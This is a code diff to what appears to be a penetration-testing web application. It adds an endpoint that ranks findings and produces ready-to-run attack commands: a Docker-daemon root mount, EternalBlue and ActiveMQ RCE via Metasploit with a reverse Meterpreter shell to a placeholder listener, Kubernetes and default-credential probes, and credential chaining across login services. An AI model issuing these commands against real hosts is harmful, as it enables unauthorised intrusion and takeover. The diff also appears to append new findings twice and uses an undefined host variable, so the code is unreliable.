@@ -5309,10 +5309,112 @@ def enrich_project(project_id):
     if new_findings:
         write_project(project)
 
+    # 3. Enrich all findings with CVSS, MITRE, remediation if missing
+    updated = 0
+    for f in project.get("findings", []):
+        changed = False
+        if not f.get("cvss_vector"):
+            _enrich_finding_cvss(f)
+            changed = True
+        if not f.get("mitre_technique"):
+            _auto_mitre_tag(f)
+            changed = True
+        if not f.get("remediation"):
+            _auto_remediation(f)
+            changed = True
+        if not f.get("exploit_cmd"):
+            vars_dict = {"lhost": "YOUR_LHOST", "lport": "4444"}
+            _attach_msf_command(f, rhost, vars_dict)
+            if f.get("exploit_cmd"):
+                changed = True
+        if changed:
+            updated += 1
+
+    if updated:
+        write_project(project)
+
+    for f in new_findings:
+        project.setdefault("findings", []).append(f)
+
+    if new_findings:
+        write_project(project)
+
     return jsonify({
         "added":       len(new_findings),
         "version_hits": len(new_findings) - ss_count,
         "ss_hits":     ss_count,
+        "enriched":    updated,
+    })
+
+
+@app.route("/api/projects/<project_id>/triage", methods=["GET"])
+@api_login_required
+def auto_triage(project_id):
+    """Auto-triage: prioritize findings and suggest next exploitation steps."""
+    project = read_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+
+    findings = project.get("findings", [])
+    ports = project.get("ports", []) or project.get("port_map", [])
+    loot = project.get("loot", [])
+    targets = project.get("targets", [])
+    rhost = targets[0] if targets else ""
+
+    # Severity priority
+    SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
+    sorted_findings = sorted(findings, key=lambda f: SEV_ORDER.get(f.get("severity", "info"), 4))
+
+    # Critical/High findings with exploit commands
+    exploitable = [f for f in sorted_findings
+                   if f.get("severity") in ("critical", "high") and f.get("exploit_cmd")]
+    no_exploit = [f for f in sorted_findings
+                  if f.get("severity") in ("critical", "high") and not f.get("exploit_cmd")]
+
+    # Credentials found
+    creds = [l for l in loot if l.get("type") in ("credential", "hash")]
+
+    # Port-based suggestions
+    port_nums = {p.get("port") for p in ports if p.get("port")}
+    suggestions = []
+    if port_nums & {2375, 2376}:
+        suggestions.append({"priority": 1, "action": "Docker Daemon RCE", "command": f"docker -H tcp://{rhost}:2375 run --rm -v /:/mnt alpine chroot /mnt sh -c 'id; cat /root/root.txt'"})
+    if port_nums & {6443, 10250}:
+        suggestions.append({"priority": 1, "action": "Kubernetes API Anonymous Access", "command": f"kubectl --server=https://{rhost}:6443 --insecure-skip-tls-verify get pods --all-namespaces"})
+    if 3000 in port_nums:
+        suggestions.append({"priority": 2, "action": "Grafana Default Creds Check", "command": f"curl -s -u admin:admin http://{rhost}:3000/api/org && echo GRAFANA_DEFAULT_CREDS_VALID"})
+    if 61616 in port_nums or 8161 in port_nums:
+        suggestions.append({"priority": 1, "action": "ActiveMQ CVE-2023-46604 RCE", "command": f"msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; set RHOSTS {rhost}; set RPORT 61616; run; sleep 15; exit'"})
+    if 8888 in port_nums:
+        suggestions.append({"priority": 1, "action": "Jupyter Notebook No-Auth RCE", "command": f"curl -s http://{rhost}:8888/api/kernelspecs && echo JUPYTER_NO_AUTH"})
+    if 9000 in port_nums:
+        suggestions.append({"priority": 2, "action": "SonarQube Default Creds", "command": f"curl -su admin:admin http://{rhost}:9000/api/system/info | grep -q 'Server ID' && echo DEFAULT_CREDS"})
+
+    # EternalBlue check
+    if any("ms17-010" in f.get("title","").lower() or "eternalblue" in f.get("title","").lower() for f in findings):
+        suggestions.append({"priority": 1, "action": "EternalBlue MS17-010 RCE", "command": f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {rhost}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_LHOST; set LPORT 4444; run'"})
+
+    # Credential suggestions
+    cred_suggestions = []
+    if creds:
+        cred_suggestions = [{"action": f"Chain credential: {c.get('value','')[:50]}", "services": [p for p in [22, 445, 5985, 3389] if p in port_nums]} for c in creds[:3]]
+
+    return jsonify({
+        "summary": {
+            "total_findings": len(findings),
+            "critical": sum(1 for f in findings if f.get("severity") == "critical"),
+            "high": sum(1 for f in findings if f.get("severity") == "high"),
+            "exploitable": len(exploitable),
+            "credentials_found": len(creds),
+        },
+        "immediate_exploits": [{"title": f.get("title"), "severity": f.get("severity"), "exploit_cmd": f.get("exploit_cmd","")[:200]} for f in exploitable[:5]],
+        "high_priority_no_exploit": [{"title": f.get("title"), "severity": f.get("severity"), "description": f.get("description","")[:100]} for f in no_exploit[:5]],
+        "next_steps": sorted(suggestions, key=lambda s: s.get("priority", 99))[:10],
+        "credential_chains": cred_suggestions,
+        "attack_surface": {
+            "ports": sorted(list(port_nums))[:30],
+            "risky_ports": sorted(list(port_nums & {21, 22, 23, 80, 135, 139, 443, 445, 1433, 2049, 2375, 3306, 3389, 5900, 5985, 6379, 6443, 8080, 8161, 8888, 9200, 27017, 61616})),
+        }
     })
 
 
